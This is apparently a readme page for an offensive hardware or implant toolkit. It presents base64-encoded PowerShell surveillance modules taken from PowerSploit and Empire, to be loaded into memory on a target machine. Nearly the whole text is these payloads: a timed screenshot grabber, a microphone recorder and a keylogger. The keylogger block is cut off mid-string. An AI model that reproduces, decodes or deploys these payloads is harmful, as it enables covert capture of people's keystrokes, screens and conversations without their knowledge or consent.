## Includes

These are encoded versions of powershell scripts pulled from projects such as powersploit, empire, and more.
These scripts are loaded into memory on the target, then payloads that use these scripts can be executed.   


## Example Includes

**Get-TimedScreenshot**

```
ZnVuY3Rpb24gR2V0LVRpbWVkU2NyZWVuc2hvdAp7CjwjCi5TWU5PUFNJUwoKVGFrZXMgc2NyZWVuc2hvdHMgYXQgYSByZWd1bGFyIGludGVydmFsIGFuZCBzYXZlcyB0aGVtIHRvIGRpc2suCgpQb3dlclNwbG9pdCBGdW5jdGlvbjogR2V0LVRpbWVkU2NyZWVuc2hvdApBdXRob3I6IENocmlzIENhbXBiZWxsIChAb2JzY3VyZXNlYykKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKICAgIAouREVTQ1JJUFRJT04KCkEgZnVuY3Rpb24gdGhhdCB0YWtlcyBzY3JlZW5zaG90cyBhbmQgc2F2ZXMgdGhlbSB0byBhIGZvbGRlci4KCi5QQVJBTUVURVIgUGF0aAoKU3BlY2lmaWVzIHRoZSBmb2xkZXIgcGF0aC4KICAgIAouUEFSQU1FVEVSIEludGVydmFsCiAgICAKU3BlY2lmaWVzIHRoZSBpbnRlcnZhbCBpbiBzZWNvbmRzIGJldHdlZW4gdGFraW5nIHNjcmVlbnNob3RzLgoKLlBBUkFNRVRFUiBFbmRUaW1lCgpTcGVjaWZpZXMgd2hlbiB0aGUgc2NyaXB0IHNob3VsZCBzdG9wIHJ1bm5pbmcgaW4gdGhlIGZvcm1hdCBISC1NTSAKCi5FWEFNUExFIAoKUFMgQzpcPiBHZXQtVGltZWRTY3JlZW5zaG90IC1QYXRoIGM6XHRlbXBcIC1JbnRlcnZhbCAzMCAtRW5kVGltZSAxNDowMCAKIAouTElOSwoKaHR0cDovL29ic2N1cmVzZWN1cml0eS5ibG9nc3BvdC5jb20vMjAxMy8wMS9HZXQtVGltZWRTY3JlZW5zaG90Lmh0bWwKaHR0cHM6Ly9naXRodWIuY29tL21hdHRpZmVzdGF0aW9uL1Bvd2VyU3Bsb2l0L2Jsb2IvbWFzdGVyL0V4ZmlsdHJhdGlvbi9HZXQtVGltZWRTY3JlZW5zaG90LnBzMQojPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV0gICAgICAgICAgICAgCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHtUZXN0LVBhdGggLVBhdGggJF8gfSldCiAgICAgICAgW1N0cmluZ10gJFBhdGgsIAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldICAgICAgICAgICAgIAogICAgICAgIFtJbnQzMl0gJEludGVydmFsLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldICAgICAgICAgICAgIAogICAgICAgIFtTdHJpbmddICRFbmRUaW1lICAgIAogICAgKQoKICAgICNEZWZpbmUgaGVscGVyIGZ1bmN0aW9uIHRoYXQgZ2VuZXJhdGVzIGFuZCBzYXZlcyBzY3JlZW5zaG90CiAgICBGdW5jdGlvbiBHZXQtU2NyZWVuc2hvdCB7CiAgICAgICAkU2NyZWVuQm91bmRzID0gW1dpbmRvd3MuRm9ybXMuU3lzdGVtSW5mb3JtYXRpb25dOjpWaXJ0dWFsU2NyZWVuCgogICAgICAgJFZpZGVvQ29udHJvbGxlciA9IEdldC1XbWlPYmplY3QgLVF1ZXJ5ICdTRUxFQ1QgVmlkZW9Nb2RlRGVzY3JpcHRpb24gRlJPTSBXaW4zMl9WaWRlb0NvbnRyb2xsZXInCgogICAgICAgaWYgKCRWaWRlb0NvbnRyb2xsZXIuVmlkZW9Nb2RlRGVzY3JpcHRpb24gLWFuZCAkVmlkZW9Db250cm9sbGVyLlZpZGVvTW9kZURlc2NyaXB0aW9uIC1tYXRjaCAnKD88U2NyZWVuV2lkdGg+XlxkKykgeCAoPzxTY3JlZW5IZWlnaHQ+XGQrKSB4IC4qJCcpIHsKICAgICAgICAgICAkV2lkdGggPSBbSW50XSAkTWF0Y2hlc1snU2NyZWVuV2lkdGgnXQogICAgICAgICAgICRIZWlnaHQgPSBbSW50XSAkTWF0Y2hlc1snU2NyZWVuSGVpZ2h0J10KICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgJFNjcmVlbkJvdW5kcyA9IFtXaW5kb3dzLkZvcm1zLlN5c3RlbUluZm9ybWF0aW9uXTo6VmlydHVhbFNjcmVlbgoKICAgICAgICAgICAkV2lkdGggPSAkU2NyZWVuQm91bmRzLldpZHRoCiAgICAgICAgICAgJEhlaWdodCA9ICRTY3JlZW5Cb3VuZHMuSGVpZ2h0CiAgICAgICB9CgogICAgICAgJFNpemUgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlNpemUoJFdpZHRoLCAkSGVpZ2h0KQogICAgICAgJFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5Qb2ludCgwLCAwKQoKICAgICAgICRTY3JlZW5zaG90T2JqZWN0ID0gTmV3LU9iamVjdCBEcmF3aW5nLkJpdG1hcCAkV2lkdGgsICRIZWlnaHQKICAgICAgICREcmF3aW5nR3JhcGhpY3MgPSBbRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkU2NyZWVuc2hvdE9iamVjdCkKICAgICAgICREcmF3aW5nR3JhcGhpY3MuQ29weUZyb21TY3JlZW4oJFBvaW50LCBbRHJhd2luZy5Qb2ludF06OkVtcHR5LCAkU2l6ZSkKICAgICAgICREcmF3aW5nR3JhcGhpY3MuRGlzcG9zZSgpCiAgICAgICAkU2NyZWVuc2hvdE9iamVjdC5TYXZlKCRGaWxlUGF0aCkKICAgICAgICRTY3JlZW5zaG90T2JqZWN0LkRpc3Bvc2UoKQogICAgfQoKICAgIFRyeSB7CiAgICAgICAgICAgIAogICAgICAgICNsb2FkIHJlcXVpcmVkIGFzc2VtYmx5CiAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5IFN5c3RlbS5XaW5kb3dzLkZvcm1zICAgICAgICAgICAgCgogICAgICAgIERvIHsKICAgICAgICAgICAgI2dldCB0aGUgY3VycmVudCB0aW1lIGFuZCBidWlsZCB0aGUgZmlsZW5hbWUgZnJvbSBpdAogICAgICAgICAgICAkVGltZSA9IChHZXQtRGF0ZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIFtTdHJpbmddICRGaWxlTmFtZSA9ICIkKCRUaW1lLk1vbnRoKSIKICAgICAgICAgICAgJEZpbGVOYW1lICs9ICctJwogICAgICAgICAgICAkRmlsZU5hbWUgKz0gIiQoJFRpbWUuRGF5KSIgCiAgICAgICAgICAgICRGaWxlTmFtZSArPSAnLScKICAgICAgICAgICAgJEZpbGVOYW1lICs9ICIkKCRUaW1lLlllYXIpIgogICAgICAgICAgICAkRmlsZU5hbWUgKz0gJy0nCiAgICAgICAgICAgICRGaWxlTmFtZSArPSAiJCgkVGltZS5Ib3VyKSIKICAgICAgICAgICAgJEZpbGVOYW1lICs9ICctJwogICAgICAgICAgICAkRmlsZU5hbWUgKz0gIiQoJFRpbWUuTWludXRlKSIKICAgICAgICAgICAgJEZpbGVOYW1lICs9ICctJwogICAgICAgICAgICAkRmlsZU5hbWUgKz0gIiQoJFRpbWUuU2Vjb25kKSIKICAgICAgICAgICAgJEZpbGVOYW1lICs9ICcucG5nJwogICAgICAgICAgICAKICAgICAgICAgICAgI3VzZSBqb2luLXBhdGggdG8gYWRkIHBhdGggdG8gZmlsZW5hbWUKICAgICAgICAgICAgW1N0cmluZ10gJEZpbGVQYXRoID0gKEpvaW4tUGF0aCAkUGF0aCAkRmlsZU5hbWUpCgogICAgICAgICAgICAjcnVuIHNjcmVlbnNob3QgZnVuY3Rpb24KICAgICAgICAgICAgR2V0LVNjcmVlbnNob3QKICAgICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNhdmVkIHNjcmVlbnNob3QgdG8gJEZpbGVQYXRoLiBTbGVlcGluZyBmb3IgJEludGVydmFsIHNlY29uZHMiCgogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkSW50ZXJ2YWwKICAgICAgICB9CgogICAgICAgICNub3RlIHRoYXQgdGhpcyB3aWxsIHJ1biBvbmNlIHJlZ2FyZGxlc3MgaWYgdGhlIHNwZWNpZmllZCB0aW1lIGFzIHBhc3NlZAogICAgICAgIFdoaWxlICgoR2V0LURhdGUgLUZvcm1hdCBISDptbSkgLWx0ICRFbmRUaW1lKQogICAgfQoKICAgIENhdGNoIHtXcml0ZS1FcnJvciAkRXJyb3JbMF0uVG9TdHJpbmcoKSArICRFcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2V9Cn0K
```

**Get-MicrophoneAudio**

```
ZnVuY3Rpb24gR2V0LU1pY3JvcGhvbmVBdWRpbyB7CjwjCi5TWU5PUFNJUwpSZWNvcmRzIGF1ZGlvIGZyb20gdGhlIG1pY3JvcGhvbmUgYW5kIHNhdmVzIHRvIGEgZmlsZSBvbiBkaXNrCkF1dGhvcjogSnVzdGluIFdhcm5lciAoQHNpeGR1YikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKQWxsIGNyZWRpdCBmb3IgUG93ZXJTcGxvaXQgZnVuY3Rpb25zIGJlbG9uZ3MgdG8gdGhlIG9yaWdpbmFsIGF1dGhvciBhbmQgcHJvamVjdCBjb250cmlidXRvcnMuIFRoYW5rcyBmb3IgdGhlIGF3ZXNvbWVuZXNzISBTZWUgaGVyZSBmb3IgbW9yZSBpbmZvOiAKaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vMjAxMi8wNS9hY2Nlc3NpbmctbmF0aXZlLXdpbmRvd3MtYXBpLWluLmh0bWwKaHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdApUaGFua3MgdG8gRWQgV2lsc29uIChTY3JpcHRpbmcgR3V5KSBmb3IgdGhlIG9uZSBsaW5lciB0byBnZW5lcmF0ZSByYW5kb20gY2hhcnMuIGh0dHBzOi8vYmxvZ3MudGVjaG5ldC5taWNyb3NvZnQuY29tL2hleXNjcmlwdGluZ2d1eS8yMDE1LzExLzA1L2dlbmVyYXRlLXJhbmRvbS1sZXR0ZXJzLXdpdGgtcG93ZXJzaGVsbC8KLkRFU0NSSVBUSU9OCkdldC1NaWNyb3Bob25lQXVkaW8gdXRpbGl6ZXMgdGhlIFdpbmRvd3MgQVBJIGZyb20gd2lubW0uZGxsIHRvIHJlY29yZCBhdWRpbyBmcm9tIHRoZSBtaWNyb3Bob25lIGFuZCBzYXZlcyB0aGUgd2F2ZSBmaWxlIHRvIGRpc2suCi5PVVRQVVRTCk91dHB1dHMgdGhlIEZpbGVJbmZvIG9iamVjdCBwb2ludGluZyB0byB0aGUgcmVjb3JkaW5nIHdoaWNoIGhhcyBiZWVuIHNhdmVkIHRvIGRpc2suCi5QQVJBTUVURVIgUGF0aApUaGUgbG9jYXRpb24gdG8gc2F2ZSB0aGUgYXVkaW8KLlBBUkFNRVRFUiBMZW5ndGgKVGhlIGxlbmd0aCBvZiB0aGUgYXVkaW8gdG8gcmVjb3JkIGluIHNlY29uZHMuIERlZmF1bHQ6IDMwCi5QQVJBTUVURVIgQWxpYXMKVGhlIGFsaWFzIHRvIHVzZSBmb3IgdGhlIFdpbk1NIHJlY29yZGluZy4gRGVmYXVsdDogUmFuZG9tIDEwIENoYXJzCi5FWEFNUExFCkdldC1NaWNyb3Bob25lQXVkaW8gLVBhdGggYzpcd2luZG93c1x0ZW1wXHNlY3JldC53YXYgLUxlbmd0aCAxMCAtQWxpYXMgIlNFQ1JFVCIKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KUmVjb3JkcyAxMCBzZWNvbmRzIG9mIGF1ZGlvIHRvIHRoZSBwYXRoIEM6XHdpbmRvd3NcdGVtcFxzZWNyZXQud2F2IHVzaW5nIFdpbk1NIGFsaWFzICJzZWNyZXQiCiM+CglbT3V0cHV0VHlwZShbU3lzdGVtLklPLkZpbGVJbmZvXSldCglQYXJhbQoJKAoJCVtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQoJCVtWYWxpZGF0ZVNjcmlwdCh7U3BsaXQtUGF0aCAkXyB8IFRlc3QtUGF0aH0pXQoJCVtTdHJpbmddICRQYXRoLAoJCVtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KCQlbSW50XSAkTGVuZ3RoID0gMzAsCgkJW1BhcmFtZXRlciggUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQoJCVtTdHJpbmddICRBbGlhcyA9ICQoLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgMTAgfCAlIHtbY2hhcl0kX30pKQoKCSkKCgkjR2V0LURlbGVnYXRlVHlwZSBmcm9tIFBvd2VyU3Bsb2l0CglmdW5jdGlvbiBMb2NhbDpHZXQtRGVsZWdhdGVUeXBlCgl7CgkJUGFyYW0KCQkoCgkJCVtPdXRwdXRUeXBlKFtUeXBlXSldCgkJCQoJCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDApXQoJCQlbVHlwZVtdXQoJCQkkUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksCgkJCQoJCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0KCQkJW1R5cGVdCgkJCSRSZXR1cm5UeXBlID0gW1ZvaWRdCgkJKQoKCQkkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KCQkkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQoJCSRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKCQkkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQoJCSRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKCQkkQ29uc3RydWN0b3JCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQoJCSRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQoJCSRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQoJCQoJCVdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgl9CgoJI0dldC1Qcm9jQWRkcmVzcyBmcm9tIFBvd2VyU3Bsb2l0CglmdW5jdGlvbiBsb2NhbDpHZXQtUHJvY0FkZHJlc3MKCXsKCQlQYXJhbQoJCSgKCQkJW091dHB1dFR5cGUoW0ludFB0cl0pXQoJCQoJCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCgkJCVtTdHJpbmddCgkJCSRNb2R1bGUsCgkJCQoJCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCgkJCVtTdHJpbmddCgkJCSRQcm9jZWR1cmUKCQkpCgoJCSMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwoJCSRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CgkJCVdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQoJCSRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKCQkjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCgkJJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKCQkkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKCQkjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAoJCSRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKCQkkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKCQkkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCgkJCgkJIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCgkJV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCgl9IAoKCSNJbml0aWFsaXplIGFuZCBjYWxsIExvYWRMaWJyYXJ5IG9uIG91ciByZXF1aXJlZCBETEwKCSRMb2FkTGlicmFyeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIExvYWRMaWJyYXJ5QQoJJExvYWRMaWJyYXJ5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10pIChbSW50UHRyXSkKCSRMb2FkTGlicmFyeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb2FkTGlicmFyeUFkZHIsICRMb2FkTGlicmFyeURlbGVnYXRlKQoJJEhORCA9ICRudWxsCgkkSE5EID0gJExvYWRMaWJyYXJ5Lkludm9rZSgnd2lubW0uZGxsJykKCWlmICgkSE5EIC1lcSAkbnVsbCkKCXsKCQlUaHJvdyAnRmFpbGVkIHRvIGFxdWlyZSBoYW5kbGUgdG8gd2lubW0uZGxsJwoJfQoKCSNJbml0aWFsaXplIHRoZSBmdW5jdGlvbiBjYWxsIHRvIGNvdW50IGRldmljZXMKCSR3YXZlSW5HZXROdW1EZXZzQWRkciA9ICRudWxsCgkkd2F2ZUluR2V0TnVtRGV2c0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mgd2lubW0uZGxsIHdhdmVJbkdldE51bURldnMKCSR3YXZlSW5HZXROdW1EZXZzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW1VpbnQzMl0pCglpZiAoJHdhdmVJbkdldE51bURldnNBZGRyIC1lcSAkbnVsbCkKCXsKCQlUaHJvdyAnRmFpbGVkIHRvIGFxdWlyZSBhZGRyZXNzIHRvIFdhdmVJbkdldE51bURldnMnCgl9Cgkkd2F2ZUluR2V0TnVtRGV2cyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCR3YXZlSW5HZXROdW1EZXZzQWRkciwgJHdhdmVJbkdldE51bURldnNEZWxlZ2F0ZSkKCgkjSW5pdGlsaXplIHRoZSBmdW5jdGlvbiBjYWxsIHRvIHJlY29yZCBhdWRpbwoJJG1jaVNlbmRTdHJpbmdBZGRyID0gJG51bGwKCSRtY2lTZW5kU3RyaW5nQWRkciA9IEdldC1Qcm9jQWRkcmVzcyB3aW5tbS5kbGwgbWNpU2VuZFN0cmluZ0EKCSRtY2lTZW5kU3RyaW5nRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10sW1N0cmluZ10sW1VJbnQzMl0sW0ludFB0cl0pIChbVWludDMyXSkKCWlmICgkbWNpU2VuZFN0cmluZ0FkZHIgLWVxICRudWxsKQoJewoJCVRocm93ICdGYWlsZWQgdG8gYXF1aXJlIGFkZHJlc3MgdG8gbWNpU2VuZFN0cmluZ0EnCgl9CgkkbWNpU2VuZFN0cmluZyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRtY2lTZW5kU3RyaW5nQWRkciwgJG1jaVNlbmRTdHJpbmdEZWxlZ2F0ZSkKCgkjSW5pdGlhbGl6ZSB0aGUgYWJpbGl0eSB0byByZXNvbHZlIE1DSSBFcnJvcnMKCSRtY2lHZXRFcnJvclN0cmluZ0FkZHIgPSAkbnVsbAoJJG1jaUdldEVycm9yU3RyaW5nQWRkciA9IEdldC1Qcm9jQWRkcmVzcyB3aW5tbS5kbGwgbWNpR2V0RXJyb3JTdHJpbmdBCgkkbWNpR2V0RXJyb3JTdHJpbmdEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSxbVGV4dC5TdHJpbmdCdWlsZGVyXSxbVUludDMyXSkgKFtib29sXSkKCWlmICgkbWNpR2V0RXJyb3JTdHJpbmdBZGRyIC1lcSAkbnVsbCkKCXsKCQlUaHJvdyAnRmFpbGVkIHRvIGFxdWlyZSBhZGRyZXNzIHRvIG1jaUdldEVycm9yU3RyaW5nJwoJfQoJJG1jaUdldEVycm9yU3RyaW5nID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJG1jaUdldEVycm9yU3RyaW5nQWRkciwkbWNpR2V0RXJyb3JTdHJpbmdEZWxlZ2F0ZSkKCgkjR2V0IGRldmljZSBjb3VudAoJJERldmljZUNvdW50ID0gJHdhdmVJbkdldE51bURldnMuSW52b2tlKCkKCglpZiAoJERldmljZUNvdW50IC1ndCAwKQoJewoKCQkjRGVmaW5lIGJ1ZmZlciBmb3IgTUNJIGVycm9ycy4gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvZGQ3NTcxNTModj12cy44NSkuYXNweAoJCSRlcnJtc2cgPSBOZXctT2JqZWN0IFRleHQuU3RyaW5nQnVpbGRlciAxNTAKCgkJI09wZW4gYW4gYWxpYXMKCQkkcnRuVmFsID0gJG1jaVNlbmRTdHJpbmcuSW52b2tlKCJvcGVuIG5ldyBUeXBlIHdhdmVhdWRpbyBBbGlhcyAkYWxpYXMiLCcnLDAsMCkKCQlpZiAoJHJ0blZhbCAtbmUgMCkgeyRtY2lHZXRFcnJvclN0cmluZy5JbnZva2UoJHJ0blZhbCwkZXJybXNnLDE1MCk7ICRtc2c9JGVycm1zZy5Ub1N0cmluZygpO1Rocm93ICJNQ0kgRXJyb3IgKCRydG5WYWwpOiAkbXNnIn0KCQkKCQkjQ2FsbCByZWNvcmRpbmcgZnVuY3Rpb24KCQkkcnRuVmFsID0gJG1jaVNlbmRTdHJpbmcuSW52b2tlKCJyZWNvcmQgJGFsaWFzIiwgJycsIDAsIDApCgkJaWYgKCRydG5WYWwgLW5lIDApIHskbWNpR2V0RXJyb3JTdHJpbmcuSW52b2tlKCRydG5WYWwsJGVycm1zZywxNTApOyAkbXNnPSRlcnJtc2cuVG9TdHJpbmcoKTtUaHJvdyAiTUNJIEVycm9yICgkcnRuVmFsKTogJG1zZyJ9CgkJCgkJU3RhcnQtU2xlZXAgLXMgJExlbmd0aAoKCQkjc2F2ZSByZWNvcmRlZCBhdWRpbyB0byBkaXNrCgkJJHJ0blZhbCA9ICRtY2lTZW5kU3RyaW5nLkludm9rZSgic2F2ZSAkYWxpYXMgYCIkcGF0aGAiIiwgJycsIDAsIDApCgkJaWYgKCRydG5WYWwgLW5lIDApIHskbWNpR2V0RXJyb3JTdHJpbmcuSW52b2tlKCRydG5WYWwsJGVycm1zZywxNTApOyAkbXNnPSRlcnJtc2cuVG9TdHJpbmcoKTtUaHJvdyAiTUNJIEVycm9yICgkcnRuVmFsKTogJG1zZyJ9CgoJCSN0ZXJtaW5hdGUgYWxpYXMKCQkkcnRuVmFsID0gJG1jaVNlbmRTdHJpbmcuSW52b2tlKCJjbG9zZSAkYWxpYXMiLCAnJywgMCwgMCk7CgkJaWYgKCRydG5WYWwgLW5lIDApIHskbWNpR2V0RXJyb3JTdHJpbmcuSW52b2tlKCRydG5WYWwsJGVycm1zZywxNTApOyAkbXNnPSRlcnJtc2cuVG9TdHJpbmcoKTtUaHJvdyAiTUNJIEVycm9yICgkcnRuVmFsKTogJG1zZyJ9CgoJCSRPdXRGaWxlID0gR2V0LUNoaWxkSXRlbSAtcGF0aCAkcGF0aCAKCQlXcml0ZS1PdXRwdXQgJE91dEZpbGUKCgl9CgllbHNlCgl7CgkJVGhyb3cgJ0ZhaWxlZCB0byBlbnVtZXJhdGUgYW55IHJlY29yZGluZyBkZXZpY2VzJwoJfQp9
```


**Get-Keystrokes**

(Yes, these modules can get massive, another reason for using an sd card to read from.)

```
ZnVuY3Rpb24gR2V0LUtleXN0cm9rZXMgewo8IwouU1lOT1BTSVMKCiAgICBMb2dzIGtleXMgcHJlc3NlZCwgdGltZSBhbmQgdGhlIGFjdGl2ZSB3aW5kb3cuCiAgICAKICAgIFBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBHZXQtS2V5c3Ryb2tlcwogICAgT3JpZ2luYWwgQXV0aG9yczogQ2hyaXMgQ2FtcGJlbGwgKEBvYnNjdXJlc2VjKSBhbmQgTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pCiAgICBSZXZpc2VkIEJ5OiBKZXNzZSBEYXZpcyAoQHNlY2Fic3RyYWN0aW9uKQogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICBSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQogICAgCi5QQVJBTUVURVIgTG9nUGF0aAoKICAgIFNwZWNpZmllcyB0aGUgcGF0aCB3aGVyZSBwcmVzc2VkIGtleSBkZXRhaWxzIHdpbGwgYmUgbG9nZ2VkLiBCeSBkZWZhdWx0LCBrZXlzdHJva2VzIGFyZSBsb2dnZWQgdG8gJVRFTVAlXGtleS5sb2cuCgouUEFSQU1FVEVSIFRpbWVvdXQKCiAgICBTcGVjaWZpZXMgdGhlIGludGVydmFsIGluIG1pbnV0ZXMgdG8gY2FwdHVyZSBrZXlzdHJva2VzLiBCeSBkZWZhdWx0LCBrZXlzdHJva2VzIGFyZSBjYXB0dXJlZCBpbmRlZmluaXRlbHkuCgouUEFSQU1FVEVSIFBhc3NUaHJ1CgogICAgUmV0dXJucyB0aGUga2V5bG9nZ2VyJ3MgUG93ZXJTaGVsbCBvYmplY3QsIHNvIHRoYXQgaXQgbWF5IG1hbmlwdWxhdGVkIChkaXNwb3NlZCkgYnkgdGhlIHVzZXI7IHByaW1hcmlseSBmb3IgdGVzdGluZyBwdXJwb3Nlcy4KCi5FWEFNUExFCgogICAgR2V0LUtleXN0cm9rZXMgLUxvZ1BhdGggQzpca2V5LmxvZwoKLkVYQU1QTEUKCiAgICBHZXQtS2V5c3Ryb2tlcyAtVGltZW91dCAyMAogICAgCi5MSU5LCgogICAgaHR0cDovL3d3dy5vYnNjdXJlc2VjLmNvbS8KICAgIGh0dHA6Ly93d3cuZXhwbG9pdC1tb